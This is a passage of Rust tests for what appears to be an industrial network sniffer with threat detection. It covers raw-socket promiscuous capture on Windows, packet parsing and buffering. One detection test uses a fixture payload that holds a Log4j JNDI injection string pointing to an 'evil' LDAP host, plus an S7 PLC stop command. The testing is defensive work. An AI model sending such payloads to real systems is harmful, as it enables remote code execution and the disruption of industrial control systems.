        assert!(rec.is_some(), "面对未知私有 L4 协议，必须优雅降级并解析基础 IP 首部，绝不能丢弃！");
        let r = rec.unwrap();
        assert_eq!(r.src_ip, "10.0.0.1");
        assert_eq!(r.dst_ip, "10.0.0.2");
        assert_eq!(r.src_port, 0);
        assert_eq!(r.dst_port, 0);
        assert_eq!(r.transport, "IP/99");
        assert_eq!(r.protocol, "UNKNOWN:0");
    }

    #[test]
    #[cfg(windows)]
    fn test_diagnose_windows_raw_socket() {
        let (local_ip, mask) = detect_primary_ipv4_and_subnet();
        println!("\n=== [DIAGNOSTIC] Windows 探测环境实测 ===");
        println!("1. detect_primary_ipv4_and_subnet => local_ip: {}, mask: {}", local_ip, mask);

        unsafe {
            let mut wsa_data: win_raw::WSADATA = std::mem::zeroed();
            let wsa_res = win_raw::WSAStartup(0x0202, &mut wsa_data);
            println!("2. WSAStartup(0x0202) => res: {}", wsa_res);

            let s = win_raw::socket(win_raw::AF_INET, win_raw::SOCK_RAW, win_raw::IPPROTO_IP);
            if s == win_raw::INVALID_SOCKET {
                let err = win_raw::WSAGetLastError();
                println!("3. socket(AF_INET, SOCK_RAW, IPPROTO_IP) => FAILED! Error Code: {} (10013=WSAEACCES 权限不足/非管理员, 10022=WSAEINVAL)", err);
            } else {
                println!("3. socket(AF_INET, SOCK_RAW, IPPROTO_IP) => SUCCESS, handle: {}", s);

                let mut sin: win_raw::SockAddrIn = std::mem::zeroed();
                sin.sin_family = win_raw::AF_INET as i16;
                sin.sin_port = 0;
                sin.sin_addr = u32::from_ne_bytes(local_ip.octets());

                let b_res = win_raw::bind(s, &sin, std::mem::size_of::<win_raw::SockAddrIn>() as i32);
                if b_res != 0 {
                    let err = win_raw::WSAGetLastError();
                    println!("4. bind to {} => FAILED! Error Code: {} (10049=WSAEADDRNOTAVAIL 地址不可用, 10048=WSAEADDRINUSE)", local_ip, err);
                } else {
                    println!("4. bind to {} => SUCCESS", local_ip);

                    let rcvall_on: u32 = win_raw::RCVALL_ON;
                    let mut bytes_ret: u32 = 0;
                    let io_res = win_raw::WSAIoctl(
                        s,
                        win_raw::SIO_RCVALL,
                        &rcvall_on as *const u32 as *const std::ffi::c_void,
                        4,
                        std::ptr::null_mut(),
                        0,
                        &mut bytes_ret,
                        std::ptr::null_mut(),
                        std::ptr::null_mut(),
                    );
                    if io_res != 0 {
                        let err = win_raw::WSAGetLastError();
                        println!("5. WSAIoctl(SIO_RCVALL) => FAILED! Error Code: {} (10013=WSAEACCES 需要管理员权限, 10022=WSAEINVAL 网卡不支持混杂)", err);
                    } else {
                        println!("5. WSAIoctl(SIO_RCVALL) => SUCCESS, 混杂模式已激活!");
                    }
                }
                win_raw::closesocket(s);
            }
            win_raw::WSACleanup();
        }

        println!("\n=== [DIAGNOSTIC] 应用层双轨服务 (端口监听免驱模式) 实测 ===");
        let tcp_ports = crate::config::dual_track_tcp_ports();
        println!("配置的 TCP 监听端口: {:?}", tcp_ports);
        for p in &tcp_ports {
            match std::net::TcpListener::bind(format!("0.0.0.0:{}", p)) {
                Ok(_) => println!("  - TCP :{} 监听绑定成功", p),
                Err(e) => println!("  - TCP :{} 监听绑定失败! 原因: {}", p, e),
            }
        }
        let udp_ports = crate::config::dual_track_udp_ports();
        println!("配置的 UDP 监听端口: {:?}", udp_ports);
        for p in &udp_ports {
            match std::net::UdpSocket::bind(format!("0.0.0.0:{}", p)) {
                Ok(_) => println!("  - UDP :{} 监听绑定成功", p),
                Err(e) => println!("  - UDP :{} 监听绑定失败! 原因: {}", p, e),
            }
        }
        println!("=======================================================\n");
    }

    #[test]
    fn test_sniffer_payload_threat_detection_integration() {
        // 构造带有工控 S7 停机和 Log4j 注入的真实 Payload 报文
        let malicious_payload = b"POST /api?param=${jndi:ldap://10.0.0.1/evil} HTTP/1.1\r\nP_STOP";
        let hits = crate::threat_detector::detect_threats_in_payload(malicious_payload);
        
        assert_eq!(hits.len(), 2, "流水线必须在单遍扫描中同时捕获 Log4j 与 S7 停机指令");
        let sig_ids: Vec<u32> = hits.iter().map(|h| h.signature_id).collect();
        assert!(sig_ids.contains(&1001)); // S7 P_STOP
        assert!(sig_ids.contains(&2001)); // Log4j
    }


    #[test]
    fn test_sniffer_baseline_and_stream_paging_pipeline_integration() {
        // 构造虚拟数据帧，验证流式缓冲池接收与有界容量统计
        let dummy = PacketRecord {
            id: 99999,
            timestamp: "22:00:00.123".to_string(),
            timestamp_ns: 123456789,
            direction: "RX".to_string(),
            transport: "TCP".to_string(),
            protocol: "MODBUS".to_string(),
            src_ip: "192.168.1.50".to_string(),
            dst_ip: "192.168.1.100".to_string(),
            src_port: 5020,
            dst_port: 502,
            length: 128,
            payload_hex: "000100000006010300000001".to_string(),
            raw_frame_hex: "".to_string(),
            entropy: 3.2,
            entropy_level: "safe".to_string(),
            mac_src: "".to_string(),
            mac_dst: "".to_string(),
            chain_hash: "hash_99999".to_string(),
            business_data: None,
            raw_text: None,
        };

        crate::stream_paging::buffer_packet_and_auto_flush(dummy);
        
        let stats = {
            let buf = crate::stream_paging::GLOBAL_STREAM_BUFFER.lock().unwrap();
            buf.get_stats()
        };
        assert!(stats.total_captured > 0, "流式分页缓冲池必须记录累积捕获总数");
        assert!(stats.current_buffered > 0, "内存缓冲队列必须正确增加记录");
    }

}
